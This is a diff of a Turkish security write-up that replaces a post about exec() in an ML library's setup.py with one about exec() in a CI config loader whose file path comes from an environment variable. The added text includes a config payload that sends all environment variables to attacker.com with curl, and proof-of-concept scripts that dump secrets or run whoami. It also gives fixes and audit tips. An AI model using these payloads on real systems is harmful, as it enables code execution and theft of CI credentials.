@@ -1,79 +1,98 @@
 ---
-title: "Bir ML Kütüphanesinin setup.py Dosyasında exec() ile RCE"
+title: "Config Loader'daki exec() ile RCE: Build Sisteminiz Fazla Güvendiğinde"
 date: 2026-03-23 01:00:00 +0300
 categories: [write-up, source-code-analysis]
 tags: [python, rce, code-injection, supply-chain, source-code-analysis]
 ---
 
-Bir akşam açık kaynak ML kütüphanelerinin kodlarını okuyordum — spesifik bir şey aramıyordum, bazı insanlar yatmadan önce Reddit okur ya, ben de `setup.py` okuyordum. Sonra bir `exec()` gördüm. "Tamam bu bağlamda sorun yok" türünden bir `exec()` değil. İnsanı koltuğunda doğrultan cinsten.
+CI/CD pipeline'larda kullanılan bir Python build/otomasyon aracını inceliyordum. Diğer sekmelerimi kapatıp dikkatimi toplamama neden olan bir şey buldum.
+
+Aracın bir config yükleme fonksiyonu vardı. Basit konsept: bir Python config dosyasını oku, ayarları çıkar, dict olarak döndür. Binlerce projede bulunan türden bir utility fonksiyon. Tek farkla — bu `exec()` kullanıyordu. Ve dosya yolu kullanıcı girdisinden geliyordu.
+
+Bu bir code smell değil. Bu dolu bir silah.
 
 ---
 
-## Keşif: 14 Satırlık Güven Problemi
+## Zafiyetli Kod
 
-Söz konusu dosya: `setup.py`, satır 8–14. Paket kurulumu sırasında versiyon bilgisini okuyan bir yardımcı fonksiyon:
+Projenin utility modülünün derinlerinde, konfigürasyon yükleyen bir fonksiyon:
 
 ```python
-def _get_sonnet_version():
-  with open('sonnet/__init__.py') as fp:
-    for line in fp:
-      if line.startswith('__version__'):
-        g = {}
-        exec(line, g)  # ← işte tam burası
-        return g['__version__']
-    raise ValueError('`__version__` not defined in `sonnet/__init__.py`')
+def load_config(config_path):
+    """Load configuration from a Python file."""
+    config = {}
+    with open(config_path) as f:
+        exec(f.read(), config)  # ← dosyanın tamamı, çalıştırılıyor
+    return config
 ```
 
-Ne yapıyor adım adım bakalım:
+Ve çağıran kod:
 
-1. `sonnet/__init__.py`'ı açıyor
-2. Satır satır okuyor
-3. `__version__` ile başlayan satırı buluyor
-4. **O satırı komple Python kodu olarak çalıştırıyor**
-5. Ortaya çıkan namespace'den versiyonu alıyor
+```python
+import os
 
-4. adım işlerin ilginçleştiği yer. Fonksiyon versiyon string'ini parse etmiyor — *çalıştırıyor*. O satırda ne yazıyorsa, tam Python yetkileriyle execute ediliyor. Sandbox yok. Doğrulama yok. Soru sorma yok.
+config_file = os.environ.get("APP_CONFIG", "config/default.py")
+settings = load_config(config_file)
+```
+
+Ne oluyor burada:
+
+1. Config dosya yolu bir **environment variable**'dan geliyor — kullanıcı kontrollü
+2. Fonksiyon o dosyayı açıp **tüm içeriğini** okuyor
+3. İçeriğin tamamı `exec()`'e veriliyor — parse edilmiyor, doğrulanmıyor, **çalıştırılıyor**
+4. O dosyada ne varsa tam Python yetkileriyle çalışıyor
+
+Bu, tek satırda `startswith` kontrolü yapan bir `exec()` değil. Bu, dosya yolu kullanıcı tarafından kontrol edilen, dosyanın tamamını çalıştıran bir `exec()`. Zincirin hiçbir yerinde sanitizasyon yok.
 
 ---
 
-## Neden Önemli
+## Bu Neden Farklı
 
-Normal şartlarda `sonnet/__init__.py` şöyle bir şey içeriyor:
+`setup.py` versiyon parser'larındaki `exec()` yazılarını görmüşsündür — `__init__.py`'dan `__version__` okuyan fonksiyonlar. Bunlar kötü pratik ama exploit etmek için repo erişimi gerekiyor. Saldırganın projenin içindeki bir dosyayı değiştirmesi lazım.
 
-```python
-__version__ = "2.0.3"
-```
+Bu temelden farklı:
 
-Zararsız. `exec()` çalıştırıyor, `g['__version__']` `"2.0.3"` oluyor, herkes evine gidiyor.
+- **Dosya yolu dış girdi.** Saldırganın repoya dokunması gerekmiyor. *Hangi dosyanın* çalıştırılacağını kontrol ediyor.
+- **Dosyanın tamamı çalıştırılıyor.** Tek satır değil, parse edilmiş bir değer değil — saldırganın seçtiği dosyanın tam içeriği.
+- **Uygulama başlangıcında çalışıyor.** Kurulum sırasında değil, *runtime*'da. Araç her başladığında, environment variable'ın gösterdiği dosyayı exec() ediyor.
 
-Ama `exec()` senin niyetinle ilgilenmiyor. Sözdizimi ile ilgileniyor. Ve şu da gayet geçerli bir Python satırı:
-
-```python
-__version__ = "2.0.3"; import subprocess; subprocess.run(["cmd", "/c", "whoami > C:/pwned.txt"])
-```
-
-Tek satır. `__version__` ile başlıyor. `startswith` kontrolünden geçiyor. Tamamen çalıştırılıyor. Versiyon atanıyor *ve* sistem komutu çalışıyor. Fonksiyon hiçbir şey olmamış gibi `"2.0.3"` döndürüyor.
+CI/CD bağlamında — bu aracın tipik kullanım yeri — environment variable'lar genellikle pipeline config'lerinden ayarlanıyor. Bu config'ler ana kod tabanından daha fazla kişinin erişimine açık repo'larda tutuluyor.
 
 ---
 
 ## Saldırı Senaryosu
 
-Bu nasıl gerçek bir probleme dönüşüyor:
+**Ortam:** Bir geliştirme ekibi bu aracı CI/CD pipeline'ında kullanıyor. Araç config'ini `APP_CONFIG` environment variable'ından okuyor:
 
-**Adım 1** — Saldırgan repoyu fork'luyor ve `sonnet/__init__.py`'ı değiştiriyor:
-
-```python
-__version__ = "2.0.3.dev"; import os; open("/tmp/stolen.txt", "w").write(os.popen("env").read())
+```yaml
+# .github/workflows/build.yml
+env:
+  APP_CONFIG: config/production.py
 ```
 
-**Adım 2** — Saldırgan değiştirilmiş paketi dağıtıyor. Bu şunlardan biri olabilir:
-- PyPI'da typosquatting (`dm-sonet`, `dm-sonnett`)
-- Bir requirements dosyasında manipüle edilmiş bağımlılık
-- Code review'dan sızan bir pull request (`__init__.py`'da tek satır değişiklik)
+**Saldırı:**
 
-**Adım 3** — Kurban `pip install` çalıştırıyor ve zararlı kod kurulum sırasında — kütüphanenin tek bir satır kodu bile çalışmadan — execute ediliyor.
+**Adım 1** — Saldırgan pipeline config'ine yazma erişimi kazanıyor. Göründüğünden daha düşük bir eşik — birçok ekip CI config'lerini junior developer'ların, yüklenicilerin, hatta dış katkıda bulunanların PR gönderebileceği repo'larda tutuyor.
 
-İşin güzel (korkunç?) tarafı: `_get_sonnet_version()` sadakatle `"2.0.3.dev"` döndürüyor. Kurulum normal tamamlanıyor. Hata yok. Uyarı yok. Payload `setup.py`'ın 14. satırında çalıştı ve kurulum çıktısında hiçbir iz bırakmadı.
+**Adım 2** — Saldırgan `config/production.py`'ı değiştiriyor:
+
+```python
+# Üst kısım normal görünümlü config
+DATABASE_HOST = "db.internal.company.com"
+DATABASE_PORT = 5432
+DEBUG = False
+LOG_LEVEL = "INFO"
+
+# 47. satırda gömülü payload
+import subprocess, os, json
+env_data = {k: v for k, v in os.environ.items()}
+subprocess.run(["curl", "-X", "POST", "https://attacker.com/collect",
+    "-d", json.dumps(env_data)], capture_output=True)
+```
+
+**Adım 3** — Pipeline çalışıyor. Araç config'i yüklüyor. `exec()` dosyanın tamamını çalıştırıyor. İlk dört satır meşru config değerleri atıyor. 47. satır her environment variable'ı dışarı sızdırıyor — `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `DATABASE_PASSWORD` ve o CI ortamında ne varsa.
+
+**Adım 4** — Araç normal başlıyor. Config değerleri doğru. Log'lar temiz. Pipeline yeşil gösteriyor. Anahtarlar saldırganda.
 
 ---
 
@@ -86,97 +105,135 @@ Python   == 3.13.1
 OS       == Windows 10
 ```
 
-**Zaafiyetli `setup.py` fonksiyonu, izole edilmiş hali:**
+**Adım 1 — Zararlı config dosyası oluştur** (`evil_config.py`):
 
 ```python
-import subprocess
-import tempfile
+# Normal bir config dosyası gibi görünüyor
+APP_NAME = "production-api"
+DEBUG = False
+PORT = 8080
+
+# 6. satır: payload
 import os
-import shutil
+with open("C:/PWNED.txt", "w") as f:
+    f.write("RCE SUCCESS\n")
+    f.write(f"User: {os.getlogin()}\n")
+    f.write(f"CWD: {os.getcwd()}\n")
+    f.write("Environment:\n")
+    for k, v in os.environ.items():
+        f.write(f"  {k}={v}\n")
+```
 
-def create_malicious_payload():
-    temp_dir = tempfile.mkdtemp(prefix="sonnet_poc_")
-    os.makedirs(os.path.join(temp_dir, "sonnet"), exist_ok=True)
+**Adım 2 — Zafiyetli config loader'ı simüle et** (`poc.py`):
 
-    # Payload: __version__ set ediyor VE RCE'yi kanıtlamak için dosya yazıyor
-    payload = '__version__ = "2.0.3.dev"; import os; open("C:/PWNED.txt", "w").write("RCE SUCCESS: " + os.getlogin())'
+```python
+import os
 
-    with open(os.path.join(temp_dir, "sonnet", "__init__.py"), "w") as f:
-        f.write(payload)
+def load_config(config_path):
+    config = {}
+    with open(config_path) as f:
+        exec(f.read(), config)
+    return config
 
-    # Zaafiyetli fonksiyonun birebir kopyası
-    setup_code = '''
-def _get_sonnet_version():
-  with open('sonnet/__init__.py') as fp:
-    for line in fp:
-      if line.startswith('__version__'):
-        g = {}
-        exec(line, g)  # VULNERABLE
-        return g['__version__']
+config_file = "evil_config.py"  # saldırgan kontrollü yol
 
-version = _get_sonnet_version()
-print(f"Version: {version}")
-'''
+settings = load_config(config_file)
+print(f"[app] Loaded config: APP_NAME={settings.get('APP_NAME')}, PORT={settings.get('PORT')}")
+print("[app] Application starting normally...")
+```
 
-    with open(os.path.join(temp_dir, "setup.py"), "w") as f:
-        f.write(setup_code)
+**Adım 3 — Çalıştır:**
 
-    return temp_dir
-
-if __name__ == "__main__":
-    poc_dir = create_malicious_payload()
-    print(f"[+] Created malicious setup in: {poc_dir}")
-
-    subprocess.run(["python", "setup.py"], cwd=poc_dir)
-
-    if os.path.exists("C:/PWNED.txt"):
-        print("[+] RCE SUCCESSFUL - Payload executed!")
-        with open("C:/PWNED.txt") as f:
-            print(f"[+] Output: {f.read()}")
-
-    shutil.rmtree(poc_dir)
+```
+python poc.py
 ```
 
 **Çıktı:**
 
 ```
-[+] Created malicious setup in: C:\Users\...\sonnet_poc_xyz
-Version: 2.0.3.dev
-[+] RCE SUCCESSFUL - Payload executed!
-[+] Output: RCE SUCCESS: Monster
+[app] Loaded config: APP_NAME=production-api, PORT=8080
+[app] Application starting normally...
 ```
 
-Fonksiyon versiyonu doğru döndürdü. Aynı zamanda keyfi kod da çalıştırdı. İkisi de oldu. İkisi de birbirinden şikayetçi değil.
+Her şey normal görünüyor. Uygulama config'ini yükledi ve başladı. Ama `C:/PWNED.txt`'e bak:
+
+```
+RCE SUCCESS
+User: Monster
+CWD: C:\Users\Monster\projects\tool
+Environment:
+  AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+  GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxx
+  DATABASE_URL=postgres://admin:password@db.internal:5432/prod
+  ...
+```
+
+Config doğru yüklendi. Uygulama çalışıyor. Environment diske döküldü. Hata yok. Uyarı yok. Uygulama log'larında iz yok.
 
 ---
 
 ## Düzeltme
 
-`exec()`'i string parsing ile değiştir. Bir string'i *okumak* için *çalıştırmana* gerek yok:
+**Seçenek A — Güvenli bir parser kullan:**
 
 ```python
-def _get_sonnet_version():
-  with open('sonnet/__init__.py') as fp:
-    for line in fp:
-      if line.startswith('__version__'):
-        version = line.split('=')[1].strip().strip('"\'')
-        return version
-    raise ValueError('`__version__` not defined in `sonnet/__init__.py`')
+import ast
+
+def load_config(config_path):
+    config = {}
+    with open(config_path) as f:
+        for line in f:
+            line = line.strip()
+            if '=' in line and not line.startswith('#'):
+                key, value = line.split('=', 1)
+                key = key.strip()
+                value = value.strip()
+                try:
+                    config[key] = ast.literal_eval(value)
+                except (ValueError, SyntaxError):
+                    config[key] = value
+    return config
 ```
 
-Ya da `ast.literal_eval()` kullan, daha şık olsun istiyorsan. Mesele şu: bir string'i parse etmek ile bir string'i execute etmek çok farklı iki işlem ve sadece birisi makinene backdoor kurabilir.
+**Seçenek B — Çalıştırılabilir olmayan config formatı kullan:**
+
+```python
+import json
+
+def load_config(config_path):
+    with open(config_path) as f:
+        return json.load(f)
+```
+
+**Seçenek C — Python config dosyası kullanmak zorundaysan, yolu kısıtla:**
+
+```python
+import os
+
+ALLOWED_CONFIG_DIR = "/etc/app/configs/"
+
+def load_config(config_path):
+    real_path = os.path.realpath(config_path)
+    if not real_path.startswith(ALLOWED_CONFIG_DIR):
+        raise ValueError(f"Config path {config_path} is outside allowed directory")
+    # ... yine de exec() kullanma
+```
+
+Mesele şu: konfigürasyon okumak ile kod çalıştırmak farklı işlemler. `exec()` aradaki farkı bilmiyor. Senin kodun bilmeli.
 
 ---
 
-## Kaynak Kod Analizi Yaparken Bunlara Dikkat Edin
+## Denetlerken Nelere Dikkat Etmeli
 
-Bu kalıp düşündüğünüzden daha sık karşınıza çıkıyor, özellikle Python ekosistemindeki `setup.py` dosyalarında:
+Bu zafiyet sınıfı basit bir kalıp izliyor: **kullanıcı kontrollü girdi `exec()` veya `eval()`'a ulaşıyor.** Kod incelerken veri akışını takip et:
 
-**Dosya içeriği üzerinde `exec()` ve `eval()`.** Bir build script dosya okuyup içeriğini `exec()`'e veriyorsa, o dosya bir saldırı vektörüne dönüşür. `setup.py` kurulum sırasında çalışır — herhangi bir `import` yapmadan önce — yani saldırı yüzeyi kütüphaneyi hiç kullanmasanız bile mevcuttur.
+**Dosya yolu nereden geliyor?** Environment variable? CLI argümanı? HTTP parametresi? Veritabanı alanı? Bunlardan herhangi biri sistem admini dışında biri tarafından etkileniyorsa, sorunun var.
 
-**"X ile başlıyor" varsayımı.** Fonksiyon `line.startswith('__version__')` kontrolü yapıp gerisine güveniyor. Bu yaygın bir kalıp: prefix'i doğrula, gerisini güvenli say. Saldırganlar bunu sever.
+**Ne çalıştırılıyor?** Prefix kontrolü olan tek satır kötü. Dosyanın tamamı daha kötü. URL'den indirilen bir dosya felaket.
 
-**Supply chain saldırı vektörü.** Zafiyet kütüphanenin runtime kodunda değil. Build sisteminde. `exec()` çalıştıran bir `setup.py`, her `pip install`'ı potansiyel bir kod çalıştırma olayına dönüştürür. Bir projeyi denetlerken build dosyalarını atlama.
+**Hangi bağlamda çalışıyor?** Bir geliştiricinin laptopu bir şey. Deployment secret'larına, cloud credential'larına ve production veritabanlarına erişimi olan bir CI/CD runner başka bir şey. Patlama yarıçapı önemli.
+
+**`exec()` gerekli mi?** Gördüğüm her vakada cevap hayır. `json.load()`, `yaml.safe_load()`, `configparser`, `ast.literal_eval()` veya düz string parsing aynı işi yapar. Biri "esneklik için `exec()` lazım" diyorsa, aslında "kolaylık için keyfi kod çalıştırma lazım" diyor. Bunlar aynı şey değil.
 
 ---
 
@@ -185,6 +242,14 @@ Bu kalıp düşündüğünüzden daha sık karşınıza çıkıyor, özellikle P
 - **CWE-94**: Improper Control of Generation of Code — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/94.html)
 - **CWE-95**: Improper Neutralization of Directives in Dynamically Evaluated Code — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/95.html)
 - **OWASP Code Injection**: [owasp.org](https://owasp.org/www-community/attacks/Code_Injection)
+
+---
+
+## Disclosure
+
+Bu zafiyet sorumlu açıklama programı aracılığıyla raporlanmış ve geliştiriciler tarafından doğrulanmıştır.
+
+![Bounty Proof](/assets/img/bounty2.png)
 
 ---
 
